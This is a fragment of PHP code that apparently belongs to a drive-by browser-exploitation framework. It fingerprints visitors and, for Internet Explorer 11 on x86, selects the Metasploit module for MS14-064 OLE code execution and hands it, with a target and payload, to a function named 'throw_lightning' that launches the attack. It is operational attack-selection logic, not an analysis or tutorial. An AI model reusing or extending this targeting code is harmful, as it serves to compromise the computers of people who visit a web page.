...
$pd_java_update = -1;
    ...
    if (($pd_br == "ie" || $ua_browser_name == "Internet Explorer")) {
      ...
      if (($ua_browser_version == "11") || ($pd_br_ver == "11")) {
          ...
          // if ($me_mshtml_build >= 16496 && $me_mshtml_build <= 16533) { // need better survey info for ms14_064_ole_code_execution
            if ($ua_os_platform == "x86") {

                $msf_exploit_full_path = "exploit/windows/browser/ms14_064_ole_code_execution";
                $msf_target = "0";
                $innerReturn = throw_lightning($hit_id, $msf_exploit_full_path, $msf_target, $msf_payload_full_path, $msf_cmd_option_one, $msf_cmd_option_two, $dbc, $innerReturn);
              }
          // } // need better survey info for ms14_064_ole_code_execution
